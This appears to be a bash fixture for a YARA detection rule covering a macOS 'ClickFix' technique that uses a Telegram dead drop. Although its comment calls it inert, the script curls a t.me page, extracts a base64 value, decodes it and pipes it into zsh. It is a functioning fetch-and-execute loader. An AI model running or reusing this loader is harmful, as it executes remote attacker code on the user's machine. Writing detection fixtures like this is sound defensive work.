#!/bin/bash
# Inert YARA fixture for CERBER_MacOS_ClickFix_C2_Domains (Telegram dead-drop) - text only, not a working sample.
page=$(curl -s https://t.me/ax03bot)
server=$(echo "$page" | grep -o 'data-server="[^"]*"' | cut -d'"' -f2)
echo "$server" | base64 -D | zsh
